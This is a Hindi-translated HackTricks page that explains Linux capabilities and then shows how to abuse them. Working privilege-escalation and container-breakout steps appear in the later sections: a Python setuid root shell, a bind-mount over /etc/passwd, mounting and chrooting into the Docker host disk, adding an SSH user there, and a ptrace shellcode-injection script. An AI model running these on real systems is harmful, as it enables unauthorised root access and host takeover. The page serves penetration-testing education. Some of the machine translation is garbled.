# लिनक्स क्षमताएँ

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert) के साथ</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **पीआर जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह सम्मेलन प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उफान मिलने का स्थान है।\\

{% embed url="https://www.rootedcon.com/" %}

## लिनक्स क्षमताएँ

लिनक्स क्षमताएँ **रूट विशेषाधिकारों को छोटे, विभिन्न इकाइयों में विभाजित** करती है, प्रक्रियाओं को विशेषाधिकार उपस्थिति की आवश्यकता के बिना पूर्ण रूप से नहीं देने से जोखिम को कम करती है।

### समस्या:
- सामान्य उपयोगकर्ताओं की सीमित अनुमतियाँ होती हैं, जैसे नेटवर्क सॉकेट खोलने जैसे कार्यों पर प्रभाव डालती हैं जिनके लिए रूट उपयोगकर्ता अधिकार आवश्यक होते हैं।

### क्षमता सेट:

1. **विरासत (CapInh)**:
- **उद्देश्य**: माता प्रक्रिया से विरासत में दी गई क्षमताएँ निर्धारित करती हैं।
- **कार्यक्षमता**: जब एक नई प्रक्रिया बनाई जाती है, तो यह अपने माता से इस सेट में क्षमताएँ विरासत में प्राप्त करती है। प्रक्रिया उत्पन्न करने के लिए कुछ विशेषाधिकारों को बनाए रखने के लिए उपयोगी है।
- **प्रतिबंध**: एक प्रक्रिया किसी ऐसी क्षमता को प्राप्त नहीं कर सकती जो उसके माता के पास नहीं थी।

2. **प्रभावी (CapEff)**:
- **उद्देश्य**: प्रक्रिया द्वारा किसी भी समय उपयोग की जा रही वास्तविक क्षमताएँ को प्रतिनिधित्व करती है।
- **कार्यक्षमता**: यह क्षमताओं का सेट कर्नल द्वारा विभिन्न ऑपरेशन के लिए अनुमति प्रदान करने के लिए जांच किया जाता है। फ़ाइलों के लिए, इस सेट में एक झंडा हो सकता है जो यह दर्शाता है कि क्या फ़ाइल की अनुमत क्षमताएँ प्रभावी मानी जानी चाहिए।
- **महत्व**: प्रभावी सेट तत्काल विशेषाधिकार की जांच के लिए महत्वपूर्ण है, यह प्रक्रिया द्वारा उपयोग किए जा सकने वाले क्षमताओं का सक्रिय सेट के रूप में काम करती है।

3. **अनुमत (CapPrm)**:
- **उद्देश्य**: प्रक्रिया की अधिकतम क्षमता सेट को परिभाषित करती है।
- **कार्यक्षमता**: प्रक्रिया अनुमत सेट से किसी क्षमता को उच्च स्तर पर ले सकती है जिसे उसके प्रभावी सेट में उपयोग करने की क्षमता होती है। यह भी किसी क्षमता को अपने अनुमत सेट से हटा सकती है।
- **सीमा**: यह प्रक्रिया के लिए निर्धारित विशेषाधिकार सीमा के लिए एक ऊपरी सीमा के रूप में काम करती है, यह सुनिश्चित करती है कि प्रक्रिया अपनी पूर्वनिर्धारित विशेषाधिकार सीमा से अधिक नहीं होती।

4. **बाउंडिंग (CapBnd)**:
- **उद्देश्य**: प्रक्रिया की जीवनकाल में प्राप्त कर सकने वाली क्षमताओं पर एक छत रखती है।
- **कार्यक्षमता**: यद्यपि किसी प्रक्रिया के विरासत या अनुमत सेट में किसी निश्चित क्षमता हो, तो वह उस क्षमता को प्राप्त नहीं कर सकती जब तक वह बाउंडिंग सेट में भी न हो।
- **उपयोग-मामला**: यह सेट प्रक्रिया की विशेषाधिकार उन्नति की संभावनाओं को प्रतिबंधित करने के लिए विशेष रूप से उपयोगी है, एक अतिरिक्त सुरक्षा स्तर जोड़ती है।

5. **वातावरणिक (CapAmb)**:
- **उद्देश्य**: `execve` सिस्टम कॉल के बाहर कुछ क्षमताओं को बनाए रखने देती है, जो सामान्यत: प्रक्रिया की क्षमताओं का पूर्ण रीसेट करने का परिणाम होता है।
- **कार्यक्षमता**: सुनिश्चित करता है कि गैर-SUID कार्यक्रम जिनके पास संबंधित फ़ाइल क्षमताएँ नहीं हैं, कुछ विशेषाधिकार बनाए रख सकते हैं।
- **प्रतिबंध**: इस सेट में क्षमताएँ विरासत और अनुमत सेटों की प्रतिबंधों के अधीन होती हैं, यह सुनिश्चित करती है कि वे प्रक्रिया की अनुमत विशेषाधिकारों से अधिक नहीं होतीं।
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
For further information check:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

एक विशेष प्रक्रिया के लिए क्षमताएँ देखने के लिए, /proc निर्देशिका में **status** फ़ाइल का उपयोग करें। यह अधिक विवरण प्रदान करता है, हम इसे केवल लिनक्स क्षमताओं से संबंधित जानकारी तक ही सीमित करेंगे।\
ध्यान दें कि सभी चल रही प्रक्रियाओं के लिए क्षमता जानकारी प्रति थ्रेड बनाए रखी जाती है, फ़ाइल सिस्टम में बाइनरी के लिए यह विस्तारित गुणधर्मों में संग्रहीत है।

आप /usr/include/linux/capability.h में परिभाषित क्षमताएँ पा सकते हैं।

वर्तमान प्रक्रिया की क्षमताएँ `cat /proc/self/status` में या `capsh --print` करके और अन्य उपयोगकर्ताओं की क्षमताएँ `/proc/<pid>/status` में पाई जा सकती हैं।
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
इस कमांड से अधिकांश सिस्टम पर 5 लाइन वापस आनी चाहिए।

* CapInh = विरासत में मिली क्षमताएँ
* CapPrm = अनुमत क्षमताएँ
* CapEff = प्रभावी क्षमताएँ
* CapBnd = सीमित सेट
* CapAmb = वातावरण क्षमताएँ सेट
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये हेक्साडेसिमल नंबर्स समझ में नहीं आ रहे। हम capsh यूटिलिटी का उपयोग करके इन्हें क्षमताओं के नाम में डिकोड कर सकते हैं।
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
चलो अब देखते हैं कि `ping` द्वारा उपयोग किए जाने वाले **क्षमताएँ** क्या हैं:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
यद्यपि वह काम करता है, एक और आसान तरीका है। एक चल रहे प्रक्रिया की क्षमताओं को देखने के लिए, बस **getpcaps** उपकरण का उपयोग करें और उसके प्रक्रिया आईडी (PID) के बाद। आप एक प्रक्रिया आईडी की सूची भी प्रदान कर सकते हैं।
```bash
getpcaps 1234
```
चलो यहाँ देखते हैं `tcpdump` की क्षमताएँ जब बाइनरी को पर्याप्त क्षमताएँ दी गई हैं (`cap_net_admin` और `cap_net_raw`) नेटवर्क को स्निफ करने के लिए (_tcpdump प्रक्रिया 9562 में चल रहा है_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
जैसा कि आप देख सकते हैं, दिए गए क्षमताओं का संबंध किसी बाइनरी की क्षमताओं के प्राप्ति के 2 तरीकों के परिणामों के साथ है।
_getpcaps_ टूल **capget()** सिस्टम कॉल का उपयोग किसी विशेष सूत्र के लिए उपलब्ध क्षमताओं का पूछताछ करने के लिए करता है। इस सिस्टम कॉल को अधिक जानकारी प्राप्त करने के लिए केवल पीआईडी प्रदान करने की आवश्यकता होती है।

### बाइनरी क्षमताएँ

बाइनरी क्षमताएँ रख सकती हैं जो कार्यान्वयन के दौरान उपयोग की जा सकती हैं। उदाहरण के लिए, `ping` बाइनरी के साथ `cap_net_raw` क्षमता पाना बहुत सामान्य है:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप **क्षमताओं के साथ बाइनरीज़ खोज सकते हैं** इस्तेमाल करके:
```bash
getcap -r / 2>/dev/null
```
### capsh के साथ capabilities को छोड़ना

यदि हम _ping_ के लिए CAP\_NET\_RAW capabilities को छोड़ दें, तो पिंग यूटिलिटी काम नहीं करनी चाहिए।
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
### हिटाएं क्षमताएँ

आप किसी बाइनरी की क्षमताएँ हटा सकते हैं।
```bash
setcap -r </path/to/binary>
```
## उपयोगकर्ता क्षमताएँ

जैसा कि प्रतीत होता है **उपयोगकर्ताओं को भी क्षमताएँ सौंपना संभव है**। यह संभावना है कि प्रत्येक प्रक्रिया जो उपयोगकर्ता द्वारा क्रियान्वित की जाती है, उपयोगकर्ता क्षमताओं का उपयोग कर सकेगी।\
[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [इस ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)और [इस ](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user)कुछ फ़ाइलें विशेष क्षमताएँ देने के लिए विन्यस्त की जानी चाहिए, लेकिन प्रत्येक उपयोगकर्ता को क्षमताएँ सौंपने वाला वह व्यक्ति `/etc/security/capability.conf` होगा।\
फ़ाइल उदाहरण:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## पर्यावरण क्षमताएँ

निम्नलिखित कार्यक्रम को कंपाइल करके **क्षमताएँ प्रदान करने वाले पर्यावरण में एक बैश शैल उत्पन्न करना संभव है**।

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
जिसमें **कंपाइल किया गया वातावरण बाइनरी द्वारा चलाया गया बैश** में **नए क्षमताएँ** देखना संभव है (एक सामान्य उपयोगकर्ता को "वर्तमान" खंड में कोई क्षमता नहीं होगी)।
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
आप **केवल उन capabilities को जोड़ सकते हैं जो स्वीकृत और विरासत में हैं**।
{% endhint %}

### क्षमता-जागरूक/क्षमता-मूर्ख बाइनरी

**क्षमता-जागरूक बाइनरी** नए capabilities का उपयोग नहीं करेंगे जो पर्यावरण द्वारा दिए गए हों, हालांकि **क्षमता-मूर्ख बाइनरी उन्हें उपयोग करेंगे** क्योंकि वे उन्हें अस्वीकार नहीं करेंगे। यह क्षमता-मूर्ख बाइनरी को विशेष वातावरण में असुरक्षित बनाता है जो बाइनरी को क्षमताएँ प्रदान करता है।

## सेवा क्षमताएँ

**मूल रूप से रूट के रूप में चल रही सेवा को सभी क्षमताएँ सौंपी जाएगी**, और कई अवसरों में यह खतरनाक हो सकता है।\
इसलिए, **सेवा कॉन्फ़िगरेशन** फ़ाइल यह निर्दिष्ट करने की अनुमति देती है कि आपको कौन सी **क्षमताएँ** चाहिए, **और** सेवा को चलाने वाला **उपयोगकर्ता** जो सेवा को अनावश्यक विशेषाधिकारों के साथ न चलाए:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## डॉकर कंटेनर में क्षमताएँ

डॉकर द्वारा कुछ क्षमताएँ कंटेनर को डिफ़ॉल्ट रूप से सौंपी जाती हैं। इन क्षमताओं को जांचना बहुत आसान है, निम्नलिखित को चला कर:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उफान मिलने का स्थान है हर विषय में।

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

जब आप **उच्चाधिकारिक ऑपरेशन करने के बाद अपने प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (उदाहरण के लिए, chroot सेट करने और सॉकेट से बाइंड करने के बाद), तो क्षमताएँ उपयोगी होती हैं। हालांकि, ये उन्हें धोखाधड़ी से उत्तरदाता आदेश या तर्क पास करके उन्हें रूट के रूप में चलाया जा सकता है।

आप `setcap` का उपयोग करके कार्यक्रमों पर क्षमताएँ थोप सकते हैं, और इन्हें `getcap` का उपयोग करके पूछ सकते हैं:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` का मतलब है कि आप क्षमता को जोड़ रहे हैं (“-” इसे हटा देगा) जैसे कि Effective और Permitted।

किसी सिस्टम या फ़ोल्डर में क्षमताओं के साथ प्रोग्रामों की पहचान करने के लिए:
```bash
getcap -r / 2>/dev/null
```
### शोध उदाहरण

निम्नलिखित उदाहरण में बाइनरी `/usr/bin/python2.6` प्राइवेस्क के लिए वंशावधि है:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**`tcpdump` को पैकेट स्निफ करने के लिए आवश्यक** **क्षमताएं**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "खाली" क्षमताएँ का विशेष मामला

[दस्तावेज़ से](https://man7.org/linux/man-pages/man7/capabilities.7.html): ध्यान दें कि किसी कार्यक्रम फ़ाइल को खाली क्षमता समूहों से संबंधित किया जा सकता है, और इस प्रकार एक सेट-यूज़र-आईडी-रूट कार्यक्रम बनाया जा सकता है जो प्रक्रिया को जिस प्रोग्राम को निष्पादित करता है का अधिकारी और सहेजी गई सेट-यूज़र-आईडी को 0 पर परिवर्तित करता है, लेकिन उस प्रक्रिया को कोई क्षमताएँ नहीं प्रदान करता। या सीधे शब्दों में, अगर आपके पास एक बाइनरी है जो:

1. रूट द्वारा स्वामित्व नहीं है
2. `SUID`/`SGID` बिट सेट नहीं है
3. खाली क्षमताएँ सेट हैं (उदा।: `getcap myelf` `myelf =ep` लौटाता है)

तो **वह बाइनरी रूप में चलेगी**।

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक उच्च प्रभावी लिनक्स क्षमता है, जिसे अक्सर एक निकट-रूट स्तर के समान माना जाता है क्योंकि इसमें **प्रशासनिक विशेषाधिकार** शामिल हैं, जैसे डिवाइस माउंट करना या कर्नेल सुविधाओं को संशोधित करना। पूरे सिस्टम की नकल करने वाले कंटेनर्स के लिए अनिवार्य होने के बावजूद, **`CAP_SYS_ADMIN` सुरक्षा चुनौतियों का सामना करता है**, खासकर कंटेनरीकृत वातावरणों में, जिसका सुरक्षा उन्नति और सिस्टम को कमजोर करने की संभावना है। इसलिए, इसका उपयोग सख्त सुरक्षा मूल्यांकन और सतर्क प्रबंधन की आवश्यकता है, एप्लिकेशन-विशेष कंटेनर्स में इस क्षमता को छोड़ने की मजबूत पसंद है ताकि **न्यूनतम विशेषाधिकार के सिद्धांत** का पालन किया जा सके और हमले की सतह को कम किया जा सके।

**बाइनरी के साथ उदाहरण**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python का उपयोग करके आप वास्तविक _passwd_ फ़ाइल के ऊपर एक संशोधित _passwd_ फ़ाइल माउंट कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में **माउंट** करें संशोधित `passwd` फ़ाइल को `/etc/passwd` पर:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप **`su` के रूप में रूट** के रूप में पासवर्ड "पासवर्ड" का उपयोग कर सकेंगे।

**परिवेश के साथ उदाहरण (डॉकर ब्रेकआउट)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताएँ जांच सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
* **Mount**

यह डॉकर कंटेनर को **माउंट करने और उसे स्वतंत्र रूप से एक्सेस करने** की अनुमति देता है:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **पूर्ण पहुंच**

पिछली विधि में हमने डॉकर होस्ट डिस्क तक पहुंच गए।\
यदि आपको लगता है कि होस्ट एक **ssh** सर्वर चल रहा है, तो आप **डॉकर होस्ट** डिस्क के अंदर एक उपयोगकर्ता **बना सकते हैं** और इसे SSH के माध्यम से एक्सेस कर सकते हैं:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**इसका मतलब है कि आप किसी प्रक्रिया में शेलकोड इंजेक्ट करके कंटेनर से बाहर निकल सकते हैं।** होस्ट में चल रही किसी प्रक्रिया तक पहुंचने के लिए कंटेनर को कम से कम **`--pid=host`** के साथ चलाया जाना चाहिए।

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` द्वारा प्रदान की जाने वाली डीबगिंग और सिस्टम कॉल ट्रेसिंग क्षमताओं का उपयोग करने की क्षमता प्रदान करता है और `process_vm_readv(2)` और `process_vm_writev(2)` जैसे क्रॉस-मेमोरी अटैच कॉल का उपयोग करने की क्षमता प्रदान करता है। यद्यपि, यदि `CAP_SYS_PTRACE` को `ptrace(2)` पर सीमाबद्ध उपायों जैसे सेकॉम्प फ़िल्टर के बिना सक्षम किया जाता है, तो यह सिस्टम सुरक्षा को काफी कमजोर कर सकता है। विशेष रूप से, यह अन्य सुरक्षा प्रतिबंधों को घोषित करने के लिए उपयोग किया जा सकता है, विशेष रूप से उन्हें जो सेकॉम्प द्वारा लागू किए गए होते हैं, जैसे कि [इस तरह के प्रमाणों (PoC) द्वारा दिखाया गया है](https://gist.github.com/thejh/8346f47e359adecd1d53)।

**बाइनरी के साथ उदाहरण (पायथन)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
